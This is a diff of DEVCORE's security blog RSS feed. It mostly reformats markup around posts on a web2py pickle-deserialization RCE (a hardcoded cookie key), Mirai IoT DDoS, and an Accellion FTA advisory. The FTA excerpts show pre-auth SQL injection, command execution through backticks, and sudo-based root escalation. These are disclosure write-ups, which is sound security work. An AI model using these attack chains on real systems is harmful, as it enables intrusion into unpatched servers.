@@ -2,20 +2,17 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
         <title>DEVCORE 戴夫寇爾</title>
-        <description>DEVCORE 戴夫寇爾 - 滲透測試、資安事件處理、教育訓練、資安顧問服務</description>
+        <description>DEVCORE 戴夫寇爾 - 滲透測試服務、資安教育訓練、資安顧問服務</description>
         <link>http://devco.re</link>
-        <lastBuildDate>Mon, 02 Jan 2017 22:58:37 +0800</lastBuildDate>
-        <pubDate>Mon, 02 Jan 2017 22:58:37 +0800</pubDate>
+        <lastBuildDate>Sun, 23 Jul 2017 17:40:14 +0800</lastBuildDate>
+        <pubDate>Sun, 23 Jul 2017 17:40:14 +0800</pubDate>
         <ttl>1800</ttl>
         <atom:link href="http://devco.re/rss" rel="self" type="application/rss+xml" />
 
 
         <item>
                 <title>WEB2PY 反序列化的安全問題－CVE-2016-3957</title>
-                <description>
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/web2py.png&quot; alt=&quot;web2py&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
+                <description>&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
 
 &lt;p&gt;在一次滲透測試的過程中，我們遇到了用 web2py 框架建構的應用程式。為了成功滲透目標，我們研究了 web2py，發現該框架範例應用程式中存在三個資訊洩漏問題，這些洩漏都會導致遠端命令執行 (RCE)。由於範例應用程式預設是開啟的，若沒有手動關閉，攻擊者可以直接利用洩漏資訊取得系統執行權限。這些問題編號分別為：CVE-2016-3952、CVE-2016-3953、CVE-2016-3954、CVE-2016-3957。&lt;/p&gt;
 
@@ -62,9 +59,9 @@
 
 &lt;p&gt;web2py 的應用程式如果使用 cookie 來儲存 session 資訊，那麼在每次接到使用者請求時會將 session cookie 用一個 secure_loads 函式將 cookie 內容讀入。 [&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/globals.py#L846&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;c&quot;&gt;# gluon/globals.py#L846&lt;/span&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;gluon/globals.py#L846&lt;/div&gt;
 
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_storage_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;cookie&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_storage_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;cookie&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
             &lt;span class=&quot;c&quot;&gt;# check if there is session data in cookies&lt;/span&gt;
             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                 &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;
@@ -79,9 +76,9 @@
 
 &lt;p&gt;secure_loads 函式內容如下，在一連串解密後會用 pickle.loads 方法將解密內容反序列化，在這裡確定 cookie 內容會使用 Pickle 處理。[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/utils.py#L200&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;c&quot;&gt;# gluon/utils.py#L200&lt;/span&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;gluon/utils.py#L200&lt;/div&gt;
 
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;:&amp;#39;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
@@ -109,8 +106,9 @@
 
 &lt;p&gt;很幸運的，我們發現 web2py 預設開啟的範例應用程式是使用 session cookie，並且有一個寫死的密鑰：&lt;code&gt;yoursecret&lt;/code&gt;。[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/applications/examples/models/session.py&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;c&quot;&gt;# applications/examples/models/session.py&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;yoursecret&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;yoursecret&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;因此，web2py 的使用者如果沒有手動關閉範例應用程式，攻擊者就可以直接在 http://[target]/examples/ 頁面發動攻擊取得主機操作權。&lt;/p&gt;
 
@@ -152,8 +150,9 @@
 
 &lt;p&gt;Version 2.14.2 使用不固定字串作為 session_cookie_key，並移除洩漏頁面。&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;c&quot;&gt;# applications/examples/models/session.py&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gluon.utils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gluon.utils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ram&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;cookie_key&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
@@ -186,10 +185,10 @@
 &lt;div class=&quot;footnotes&quot;&gt;
   &lt;ol&gt;
     &lt;li id=&quot;fn:note1&quot;&gt;
-      &lt;p&gt;其實 CVE-2016-3957 並非不安全的設計，在跟 CVE team 溝通的過程中發現 web2py 開始使用 JSON 取代 Pickle [&lt;a href=&quot;https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0&quot;&gt;Ref&lt;/a&gt;]，因此判定 web2py 認為目前的設計是不洽當的，給予此編號。後來官方因故將 Pickle 改了回來，不過在沒有洩漏加密字串的前提下已經是安全的了。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;其實 CVE-2016-3957 並非不安全的設計，在跟 CVE team 溝通的過程中發現 web2py 開始使用 JSON 取代 Pickle [&lt;a href=&quot;https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0&quot;&gt;Ref&lt;/a&gt;]，因此判定 web2py 認為目前的設計是不洽當的，給予此編號。後來官方因故將 Pickle 改了回來，不過在沒有洩漏加密字串的前提下已經是安全的了。&amp;nbsp;&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
     &lt;li id=&quot;fn:note2&quot;&gt;
-      &lt;p&gt;在自行架設的 web2py 環境中只會執行一次，沒有去細追 web2py 官方網站為何執行兩次。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;在自行架設的 web2py 環境中只會執行一次，沒有去細追 web2py 官方網站為何執行兩次。&amp;nbsp;&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
@@ -201,10 +200,7 @@
 
         <item>
                 <title>IoT設備商別成為幫兇 從Dyn DDoS攻擊事件看IoT安全</title>
-                <description>
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20161226/mirai.png&quot; alt=&quot;mirai&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;section&quot;&gt;萬物皆聯網成為萬物皆可駭&lt;/h3&gt;
+                <description>&lt;h3 id=&quot;section&quot;&gt;萬物皆聯網成為萬物皆可駭&lt;/h3&gt;
 
 &lt;p&gt;2016年10月21日知名網路服務 Dyn 遭受殭屍網路發動三波巨大規模 DDoS 攻擊，世界各大網站服務皆因為此攻擊而中斷，包括 Amazon、Twitter、Github、PayPal 等大型網站都因此受到影響。資安人員研究發現，本次 DDoS 攻擊的發起者未明，但多數攻擊流量來自殭屍網路「Mirai」，利用 IPCAM、CCTV、DVR、IoT 裝置等系統進行 DDoS 攻擊。為什麼這些設備會成為攻擊的幫凶呢？我們又該如何自保呢？&lt;/p&gt;
 
@@ -239,15 +235,10 @@
 
         <item>
                 <title>Advisory: Accellion File Transfer Appliance Vulnerability</title>
-                <description>
-&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
+                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160922/Accellion.jpeg&quot; alt=&quot;Accellion&quot; /&gt;&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -314,7 +305,7 @@ Determine from the domain name and SSL Certificate of these servers, FTA is wide
 &lt;p&gt;After code reviewing, a pre-authentication SQL Injection vulnerability was found in FTA. This vulnerability grants malicious users access to sensitive data and personal information on the server through SQL Injection, and launch remote code execution (RCE) by further exploiting privilege-escalating vulnerabilities.&lt;br /&gt;
 The key to this problem lies in the &lt;code&gt;client_properties( ... )&lt;/code&gt; function called by security_key2.api!&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;/home/seos/courier/security_key2.api&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -397,7 +388,7 @@ In the function &lt;code&gt;construct_where_clause( ... )&lt;/code&gt;, every pa
 
 &lt;p&gt;This is not a problem, since the database can be accessed with the SQL Injection vulnerability mentioned earlier. Also, although there are some parameter filters in the code, they can be bypassed!&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;/home/seos/courier/sfUtils.api&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fc&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -458,7 +449,7 @@ Execute system commands directly by using backticks (`)&lt;/p&gt;
 
 &lt;h5 id=&quot;incorrect-rsync-configuration&quot;&gt;1. Incorrect Rsync Configuration&lt;/h5&gt;
 
-&lt;p&gt;&lt;strong&gt;/etc/opt/rsyncd.conf&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;&lt;span class=&quot;k&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/home/soggycat/log/kennel.log&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;...&lt;/span&gt;
@@ -493,7 +484,7 @@ Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&amp;#39;0,0.0.0.0&a
 
 &lt;p&gt;To enable system updates through web UI, the sudoers configuration in FTA exceptionally allows the user nobody to directly execute commands with root privileges and update software with the program &lt;code&gt;yum-client.pl&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;/etc/sudoers&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;...
 &lt;span class=&quot;nb&quot;&gt;Cmnd_Alias&lt;/span&gt;      YUM_UPGRADE = &lt;span class=&quot;sx&quot;&gt;/usr/bin/yum&lt;/span&gt; -y upgrade
@@ -511,7 +502,7 @@ Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&amp;#39;0,0.0.0.0&a
 
 &lt;p&gt;&lt;code&gt;YUM_CLIENT&lt;/code&gt; is the command for proceeding updates. Part of the codes are as follows:&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;/usr/local/bin/yum-client.pl&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
@@ -616,15 +607,10 @@ Upon discovering the FTA vulnerability in early February, I notified Facebook an
 
         <item>
                 <title>Accellion File Transfer Appliance 弱點報告</title>
-                <description>
-&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
+                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt; &lt;br /&gt;
 &lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160922/Accellion.jpeg&quot; alt=&quot;Accellion&quot; /&gt;&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -689,7 +675,7 @@ Accellion File Transfer Appliance (以下簡稱 FTA) 為一款安全檔案傳輸
 
 &lt;p&gt;經過代碼審查後，在 FTA 中發現一個不須驗證的 SQL Injection，這使得惡意使用者可透過 SQL Injection 存取伺服器的敏感檔案及個人資料，並配合權限設定問題導致遠端代碼執行。問題出在 security_key2.api 中所呼叫到的 &lt;code&gt;client_properties( ... )&lt;/code&gt; 函數中！&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;/home/seos/courier/security_key2.api&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -771,7 +757,7 @@ Accellion File Transfer Appliance (以下簡稱 FTA) 為一款安全檔案傳輸
 
 &lt;p&gt;這點對我們來說不是問題，從前面的 SQL Injection 弱點可任意讀取資料庫內容，另外雖然在程式碼中有對參數進行一些過濾，但那些過濾是可以繞過的！&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;/home/seos/courier/sfUtils.api&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fc&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -831,7 +817,7 @@ Accellion File Transfer Appliance (以下簡稱 FTA) 為一款安全檔案傳輸
 
 &lt;h5 id=&quot;rsync-&quot;&gt;1. Rsync 配置錯誤&lt;/h5&gt;
 
-&lt;p&gt;&lt;strong&gt;/etc/opt/rsyncd.conf&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;&lt;span class=&quot;k&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/home/soggycat/log/kennel.log&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;...&lt;/span&gt;
@@ -866,7 +852,7 @@ Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&amp;#39;0,0.0.0.0&a
 
 &lt;p&gt;在 FTA 中，為了使系統可以直接透過網頁介面進行更新，因此在 sudoers 配置中特別針對 nobody 用戶允許直接使用 root 權限執行指令，並透過 &lt;code&gt;yum-client.pl&lt;/code&gt; 這隻程式進行軟體更新&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;/etc/sudoers&lt;/strong&gt;&lt;/p&gt;
